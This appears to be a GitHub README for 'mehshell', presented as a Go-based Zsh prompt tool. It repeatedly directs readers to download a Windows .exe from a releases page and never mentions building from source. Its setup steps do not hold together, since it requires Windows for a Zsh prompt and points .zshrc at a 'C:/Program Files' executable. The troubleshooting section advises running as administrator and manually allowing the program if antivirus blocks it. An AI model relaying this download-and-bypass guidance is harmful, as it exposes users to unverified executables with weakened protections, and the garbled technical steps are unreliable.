# ⚡ mehshell - Fast and Simple Zsh Prompt Engine

[![Download mehshell](https://img.shields.io/badge/Download-mehshell-brightgreen?style=for-the-badge)](https://github.com/pacoacquainted25/mehshell/releases)

---

## 📋 About mehshell

mehshell is a fast and lightweight prompt engine for the Zsh shell. It acts as an alternative to Powerlevel10k (p10k) but is written in Go for speed and simplicity. The prompt adapts to your terminal and shows useful information, such as current directory, git status, and more.

This tool is perfect for users who want a clean, fast, and customizable prompt without added complexity. It works alongside your existing zsh setup and integrates well with dotfiles.

---

## 🚀 Getting Started

To use mehshell, you need a Windows computer with the Zsh shell installed. Zsh is a popular command shell that you can run on Windows through programs like Windows Subsystem for Linux (WSL) or Cygwin.

### Minimum Requirements:

- Windows 10 or later
- Zsh installed on your system (via WSL or other tools)
- Access to a terminal emulator like Windows Terminal or PowerShell that supports running Zsh
- Internet connection to download the software

If you do not have Zsh installed, you can install it through WSL using this command in PowerShell or Command Prompt:

```bash
wsl sudo apt update && sudo apt install zsh
```

For more on installing Zsh on Windows, check the official Microsoft or Ubuntu documentation.

---

## ⬇️ Download and Install mehshell

To get mehshell, follow these steps:

1. Visit the release page by clicking the link below.

[![Download mehshell](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/pacoacquainted25/mehshell/releases)

2. On the release page, locate the latest version. Releases are sorted with the newest at the top.

3. Look for the Windows executable file (`.exe`) or an archive file containing the program files.

4. Click the file to download it to your Downloads folder.

5. Once downloaded, open the file or extract it if it is archived.

6. Place the executable in a folder where you want to keep mehshell, for example:
   - `C:\Program Files\mehshell\`
   - or `C:\Users\YourUsername\mehshell\`

---

## 🛠 Setup mehshell in your Zsh prompt on Windows

After downloading, you need to configure Zsh to use mehshell as your prompt.

1. Open your terminal emulator where you use Zsh.

2. Open your Zsh configuration file `.zshrc` in a text editor. You can open it using the command:

```bash
nano ~/.zshrc
```

3. Add the following line to the end of the `.zshrc` file. Replace the path with the location where you saved `mehshell.exe`:

```bash
PROMPT='$(C:/Program\ Files/mehshell/mehshell.exe)'
```

4. Save the file and exit the text editor. In `nano`, press `Ctrl + O`, then `Enter`, then `Ctrl + X`.

5. Restart your terminal or reload your `.zshrc` file by running:

```bash
source ~/.zshrc
```

Your prompt will now switch to mehshell, showing a fast and informative command line prompt.

---

## ⚙ Features

- **Fast Execution:** Written in Go, mehshell runs quickly even on slower machines.
- **Customizable Prompt:** You can adjust colors and information displayed by modifying the `.zshrc` options.
- **Git Integration:** Shows branch name and git status within your prompt.
- **Nerd Fonts Support:** Uses symbols and icons if you have Nerd Fonts installed, making your prompt clearer.
- **Minimal Dependencies:** Does not require complex setups or large frameworks.
- **Compatibility:** Works with most terminal emulators on Windows supporting Zsh.

---

## 🖥 Usage Tips

- To update mehshell, simply download the latest version from the release page and replace your old file.
- If your prompt looks strange, ensure your terminal uses a Nerd Font to display special symbols. You can download Nerd Fonts from https://www.nerdfonts.com/.
- Adjust prompt options by editing `.zshrc` or passing flags to mehshell if needed. See the documentation on the release page for advanced configuration.
- To disable mehshell temporarily, comment out the `PROMPT` line in `.zshrc` and reload the terminal.

---

## 📝 Troubleshooting

- **Prompt does not change:** Check if you correctly edited `.zshrc` and that the path to `mehshell.exe` is correct.
- **Symbols do not show properly:** Make sure your terminal font supports Nerd Fonts.
- **Zsh is not installed:** Follow instructions to install Zsh using WSL or other tools.
- **Permission errors running mehshell:** Run your terminal as an administrator or change file permissions.
- **Windows blocking mehshell:** If Windows Defender or antivirus blocks the program, you may need to allow it manually.

---

## 🌐 Useful Links

- [Download mehshell releases page](https://github.com/pacoacquainted25/mehshell/releases)
- [Nerd Fonts](https://www.nerdfonts.com/)
- [Windows Subsystem for Linux Installation Guide](https://learn.microsoft.com/en-us/windows/wsl/install)
- [Zsh Shell Documentation](http://zsh.sourceforge.net/Guide/)

---

## 📂 About this repository

mehshell is open source. Its primary goal is to improve your terminal experience with a fast, clean prompt. It is implemented in Go and integrates well with popular developer tools.

Topics related to the tool include: `cli`, `dotfiles`, `go`, `golang`, `nerd-fonts`, `prompt`, `shell`, `terminal`, `zsh`, `zsh-prompt`, and `zsh-theme`.

If you want to contribute or report bugs, you can find source code and instructions on the GitHub page.